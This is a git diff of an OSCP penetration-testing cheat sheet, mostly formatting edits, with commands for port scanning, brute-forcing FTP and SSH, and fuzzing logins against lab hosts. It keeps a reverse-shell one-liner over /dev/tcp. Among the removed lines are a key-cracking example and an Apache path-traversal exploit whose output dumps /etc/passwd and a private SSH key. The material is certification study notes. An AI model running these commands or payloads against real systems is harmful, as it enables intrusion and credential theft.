@@ -1,4 +1,4 @@
-# OSCP Cheat Sheet <img src="https://media.giphy.com/media/M9gbBd9nbDrOTu1Mqx/giphy.gif" width="100"/>
+## OSCP Cheat Sheet <img src="https://media.giphy.com/media/M9gbBd9nbDrOTu1Mqx/giphy.gif" width="100"/>
 ## If anything is missing refer here
 ````
 https://github.com/0xsyr0/oscp
@@ -8,20 +8,16 @@ https://github.com/0xsyr0/oscp
 ````
 ping $IP #63 ttl = linux #127 ttl = windows
 ````
-
 ````
 nmap -p- --min-rate 1000 $IP
 nmap -p- --min-rate 1000 $IP -Pn #disables the ping command and only scans ports
 ````
-
 ````
 nmap -p <ports> -sV -sC -A $IP
 ````
-
 ````
 nmap -sS -p- --min-rate=1000 10.11.1.229 -Pn #stealth scans
 ````
-
 ````
 target/release/rustscan -a 10.11.1.252
 ````
@@ -57,11 +53,9 @@ hydra -l steph -P /usr/share/wfuzz/wordlist/others/common_pass.txt 10.1.1.68 -t 
 hydra -l steph -P /usr/share/wordlists/rockyou.txt 10.1.1.68 -t 4 ftp
 ````
 ##### Downloading files recursively
-
 ````
 wget -r ftp://steph:billabong@10.1.1.68/
 ````
-
 ````
 find / -name Settings.*  2>/dev/null #looking through the files
 ````
@@ -69,14 +63,12 @@ find / -name Settings.*  2>/dev/null #looking through the files
 #### SSH port 22
 ##### Emumeration
 ##### Exploitation
-
 ````
 ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa bob@10.11.1.141 -t 'bash -i >& /dev/tcp/192.168.119.140/443 0>&1'
 
 nc -nvlp 443
 ````
 ###### no matching key exchange method found.
-
 ````
 ssh -oKexAlgorithms=+diffie-hellman-group1-sha1\
  -oHostKeyAlgorithms=+ssh-rsa\
@@ -84,7 +76,6 @@ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1\
  admin@10.11.1.252 -p 22000
 ````
 ##### Brute Force
-
 ````
 hydra -l megan -P /usr/share/wfuzz/wordlist/others/common_pass.txt 10.1.1.27 -t 4 ssh
 ````
@@ -93,26 +84,6 @@ hydra -l megan -P /usr/share/wfuzz/wordlist/others/common_pass.txt 10.1.1.27 -t 
 chmod 600 id_rsa
 ssh mario@172.16.138.14 -i id_rsa
 ````
-##### Cracking Private key
-
-````
-ssh2john id_ecdsa > id_ecdsa.hash
-john --wordlist=/usr/share/wordlists/rockyou.txt id_ecdsa.hash
-fireball         (id_ecdsa)
-````
-##### Path to keys
-
-````
-/etc/ssh/*pub #Use this to find the type of key
-
-ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK6SiUV5zqxqNJ9a/p9l+VpxxqiXnYri40OjXMExS/tP0EbTAEpojn4uXKOgR3oEaMmQVmI9QLPTehCFLNJ3iJo= root@web01
-`````
-
-`````
-/home/anita/.ssh/id_ecdsa.pub #Use this to confirm the above exists
-/home/anita/.ssh/id_ecdsa #Use this to confirm the private key exists
-````
-
 #### Telnet port 23
 ##### Login
 ````
@@ -122,7 +93,6 @@ telnet -l james 10.2.2.23
 ````
 nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25
 ````
-
 ````
 nc -nv $IP 25
 telnet $IP 25
@@ -181,7 +151,6 @@ Database files such as .mdb, .sqlite, .db, and .sql files.
 ````
 ffuf -c -request request.txt -request-proto http -mode clusterbomb -fw 1 -w /usr/share/wordlists/rockyou.txt:FUZZ
 ````
-
 ````
 POST /index.php HTTP/1.1
 
@@ -213,7 +182,6 @@ Upgrade-Insecure-Requests: 1
 
 username=admin&password=FUZZ&submit=Log+In
 ````
-
 ````
 [Status: 302, Size: 63, Words: 10, Lines: 1, Duration: 165ms]
     * FUZZ: asdfghjkl;'
@@ -221,11 +189,9 @@ username=admin&password=FUZZ&submit=Log+In
 [Status: 302, Size: 63, Words: 10, Lines: 1, Duration: 172ms]
     * FUZZ: asdfghjkl;\\'
 ````
-
 ````
 https://cybersecnerds.com/ffuf-everything-you-need-to-know/
 ````
-
 ##### CMS 
 ###### WP Scan
 ````
@@ -266,35 +232,6 @@ https://github.com/hupe1980/CVE-2009-4623/blob/main/exploit.py
 ````
 CVE-2018-18619 https://www.exploit-db.com/exploits/45853 Advanced Comment System 1.0 - SQL Injection
 ````
-##### Attack Vector
-###### 80/tcp   open  http     Apache httpd 2.4.49
-````
-In this case we were able to attack a box based on its apache server version.
-Its important we remember that these are valid initial footholds and we try them.
-````
-````
-/exploit.sh targets.txt /etc/passwd           
-192.168.138.245:8000
-root:x:0:0:root:/root:/bin/bash
-
-./exploit.sh targets.txt /etc/ssh/*pub
-192.168.138.245:8000
-ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK6SiUV5zqxqNJ9a/p9l+VpxxqiXnYri40OjXMExS/tP0EbTAEpojn4uXKOgR3oEaMmQVmI9QLPTehCFLNJ3iJo= root@web01
-
-/exploit.sh targets.txt /home/anita/.ssh/id_ecdsa
-
-192.168.138.245:8000
------BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAO+eRFhQ
-13fn2kJ8qptynMAAAAEAAAAAEAAABoAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlz
-dHAyNTYAAABBBK+thAjaRTfNYtnThUoCv2Ns6FQtGtaJLBpLhyb74hSOp1pn0pm0rmNThM
-fArBngFjl7RJYCOTqY5Mmid0sNJwAAAACw0HaBF7zp/0Kiunf161d9NFPIY2bdCayZsxnF
-ulMdp1RxRcQuNoGPkjOnyXK/hj9lZ6vTGwLyZiFseXfRi8Dd93YsG0VmEOm3BWvvCv+26M
-8eyPQgiBD4dPphmNWZ0vQJ6qnbZBWCmRPCpp2nmSaT3odbRaScEUT5VnkpxmqIQfT+p8AO
-CAH+RLndklWU8DpYtB4cOJG/f9Jd7Xtwg3bi1rkRKsyp8yHbA+wsfc2yLWM=
------END OPENSSH PRIVATE KEY-----
-````
-
 ##### ? notes
 ##### /etc/hosts FQDN
 ###### Background
@@ -401,8 +338,7 @@ HOP RTT       ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 32.21 seconds
-````
-
+`````
 ![image](https://user-images.githubusercontent.com/127046919/234426419-f8aa53ae-f5f7-4815-92d5-99dfde8ba5fb.png)
 
 
@@ -412,7 +348,6 @@ In this situation we used another service on port 4555 and reset the password of
 ````
 nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -p 110 $IP
 ````
-
 ````
 telnet $IP 110 #Connect to pop3
 USER ryuu #Login as user
